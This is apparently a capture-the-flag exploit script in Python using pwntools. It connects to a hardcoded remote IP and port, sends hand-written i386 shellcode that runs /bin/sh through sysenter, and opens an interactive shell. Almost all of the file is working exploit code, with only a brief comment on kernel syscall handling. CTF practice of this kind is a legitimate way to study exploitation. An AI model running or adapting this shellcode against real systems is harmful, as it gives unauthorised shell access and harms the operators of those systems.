#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "54.65.133.244"
port = 8361
r = remote(host,port)



context.arch = "i386"

sc = asm("""
    jmp sh
exec:
    mov ebp,esp
    pop ebx
    mov al,0xb
    sysenter
sh:
    call exec
    .ascii "/bin/sh"
""",arch="i386")

# regs->ip is a 64 bit value in do_fast_syscall_32
r.recvuntil(":")
print len(sc)
r.send(sc)
r.interactive()

